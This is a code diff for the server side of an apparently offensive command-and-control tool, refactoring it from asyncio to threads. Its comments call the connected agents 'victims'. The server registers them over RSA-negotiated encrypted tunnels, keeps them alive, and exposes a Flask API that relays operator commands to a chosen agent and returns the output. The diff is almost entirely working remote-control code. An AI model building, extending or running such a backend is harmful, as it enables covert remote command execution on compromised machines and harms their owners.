@@ -1,4 +1,3 @@
-import asyncio
 import rsa
 import zlib
 import uuid
@@ -18,9 +17,13 @@ from lib import api, logger
 from lib.api import HTTP_SESSION
 from lib.crypto import EncryptedTunnel, get_hwid
 
-"""
-TODO: apply logging in main.py  -> handle_victims
-"""
+@dataclass
+class ServerConfig:
+    FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
+    BUFSIZE: int
+
+    # { addr: [FINGERPRINT, PCNAME, obj(EncryptedTunnel)]}
+    AGENTS: dict
 
 # ----> [ CLI parsing ] <----
 
@@ -36,7 +39,7 @@ CONFIG      = tomllib.load(open(CURRENT_DIR + "/config/config.toml", "rb"))
 
 app_api      = Flask(__name__)
 http_session = HTTP_SESSION()
-
+server_cfg   = ServerConfig(1024, {})
 
 try:
     WHITELIST            = CONFIG.get("whitelist")
@@ -45,23 +48,12 @@ try:
 except Exception as e:
     print(e)
 
-
-@dataclass
-class ServerConfig:
-    FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
-    BUFSIZE: int
-
-    # { addr: [FINGERPRINT, PCNAME, obj(EncryptedTunnel)]}
-    AGENTS: dict
-
-server_cfg = ServerConfig(1024, {})
-
 def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
-   
+    
     # >>> [ACCESS] <<<
     
     @app_api.route("/access", methods=["POST"])
-    async def access():
+    def access():
         json_body: dict = request.get_json()
         
         USERNAME: str = json_body["username"]
@@ -88,7 +80,7 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
      # >>> [GET_AGENTS] <<<
     
     @app_api.route("/get_agents/<session>")
-    async def send_agents(session):
+    def send_agents(session):
 
         if http_session.exist(request.remote_addr, session):
             
@@ -106,9 +98,11 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         else:
             logger.info(f"{request.remote_addr}: invalid session ({session})")
             return jsonify({"error": "Invalid session"})
-        
+
+    # >>> [EXIST_AGENT] <<<
+
     @app_api.route("/exist_agent", methods=["POST"])
-    async def check_agent_exist():
+    def check_agent_exist():
         json_body = request.json
 
         SESSION = json_body["session"]
@@ -117,32 +111,34 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         if http_session.exist(request.remote_addr, SESSION):
             agent_addr = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
             
-            return jsonify(not (agent_addr is None))
+            return jsonify({"exist": not (agent_addr is None), "addr": agent_addr})
 
     # >>> [ SEND_COMMAND ] <<<
 
     @app_api.route("/send_command", methods=["POST"])
-    async def agent_command():
+    def agent_command():
         json_body: dict = request.get_json()
         
-        COMMAND = json_body["command"]
-        AGENT_FINGERPRINT = json_body["fingerprint"]
+        COMMAND: bytes = json_body["command"].encode()
+        AGENT_FINGERPRINT: str = json_body["fingerprint"]
 
-        key_agent = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
-        
-        if not (key_agent is None):
-            s: EncryptedTunnel = server_cfg.AGENTS[key_agent][2]
+        agent_addr = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
+
+        if not (agent_addr is None):
+            s: EncryptedTunnel = server_cfg.AGENTS[agent_addr][2]
             
             try:
-                logger.info(f"sending ({COMMAND}) command to {key_agent}")             
+                logger.info(f"sending ({COMMAND}) command to {agent_addr}")             
                 # TODO: do better  -> set recv dynamic bufsize
                 s.send(COMMAND)
 
-                logger.info("command output sended")             
-                return jsonify({"output": await s.recv(server_cfg.BUFSIZE).decode()})
+                logger.info("command output sended") 
+
+                command_output = s.recv(server_cfg.BUFSIZE).decode()       
+                return jsonify({"output": command_output})
             
             except Exception as e:
-                logger.error(f"sending command failed: {key_agent}")
+                logger.error(f"sending command failed: {agent_addr}")
                 return jsonify({"error": str(e)}), 408
         
         else:
@@ -156,17 +152,13 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
     else:
         app_api.run(host, port, debug)
 
-async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
-    PEERNAME = w.get_extra_info('peername')
-    CLIENT_SOCKET: socket.socket = w.get_extra_info('socket')
-    
-    formated_peername = PEERNAME[0] + ':' + str(PEERNAME[1])
-    
+def handle_agents(client_socket: socket.socket, client_addr: tuple):
+    formated_peername = client_addr[0] + ':' + str(client_addr[1])
 
     # Get a fingerprint (random string)
-    fingerprint = await r.read(server_cfg.BUFSIZE)
+    fingerprint = client_socket.recv(server_cfg.BUFSIZE)
 
-    logger.info(f"Agent connected {PEERNAME}/{fingerprint}")
+    logger.info(f"Agent connected {client_addr}/{fingerprint}")
 
     # Generate rsa keys
     # will be used for key exchange + nonce to start communicating only with Salsa20
@@ -174,11 +166,10 @@ async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.Stre
     public_key, private_key = rsa.newkeys(1024) 
     public_key_pem = rsa.PublicKey.save_pkcs1(public_key)
 
-    w.write(public_key_pem)
-    await w.drain()
+    client_socket.send(public_key_pem)
 
     # Gets the RSA-encrypted string containing the key and nonce
-    decrypted = rsa.decrypt(await r.read(server_cfg.BUFSIZE), private_key)
+    decrypted = rsa.decrypt(client_socket.recv(server_cfg.BUFSIZE), private_key)
     decompressed = zlib.decompress(decrypted)
     
     key, nonce = decompressed.split(b"<SPR>")
@@ -187,26 +178,35 @@ async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.Stre
     del(decrypted)
     del(decompressed)
 
-    enctunnel = EncryptedTunnel(r, w, key, nonce)
+    enctunnel = EncryptedTunnel(client_socket, key, nonce)
 
     # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
     server_cfg.AGENTS[formated_peername] = [fingerprint, "pcname", enctunnel]
 
-    CLIENT_SOCKET.setblocking(0)
-    ready = select.select([CLIENT_SOCKET], [], [], 5)
+    client_socket.setblocking(0)
+    ready = select.select([client_socket], [], [], 5)
 
     # Stay alive
     while True:
-        time.sleep(5)
+        time.sleep(10)
         try:
-            await enctunnel.send(b'2')    
+            enctunnel.send(b'2')    
             if ready[0]:
-                await enctunnel.recv(2)
+                enctunnel.recv(2)
         except:
             server_cfg.AGENTS.pop(formated_peername)
             break
 
-async def main():
+def server_agents(ip: str, port: int):
+    server_socket = socket.socket()
+    server_socket.bind((ip, port))
+    server_socket.listen(-1)
+    
+    while True:
+        client, addr = server_socket.accept()
+        threading.Thread(target=handle_agents, args=(client, addr)).start()
+
+def main():
     args = parser.parse_args()
     logger.debug(f"arguments: {args}")
 
@@ -214,7 +214,7 @@ async def main():
     logging.getLogger("werkzeug").disabled = True
 
     # Open multiple server
-    server_agents = await asyncio.start_server(handle_agents, AGENT_IP, AGENT_PORT)
+    server_thread_agents = threading.Thread(target=server_agents, args=(AGENT_IP, int(AGENT_PORT)))
     logger.info(f"Socket server opened: {AGENT_IP}:{AGENT_PORT}")
 
     if args.ssl:
@@ -224,12 +224,12 @@ async def main():
     else:
         https_files = ()
 
-    threading.Thread(target=server_api, args=(HTTP_IP, HTTP_PORT, False, https_files)).start()
+    server_thread_api = threading.Thread(target=server_api, args=(HTTP_IP, HTTP_PORT, False, https_files))
     logger.info(f"HTTP server opened: {HTTP_IP}:{HTTP_PORT}")
 
-    # Looping server
-    async with server_agents:
-        await server_agents.serve_forever()
+    # Start threads
+    server_thread_agents.start()
+    server_thread_api.start()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
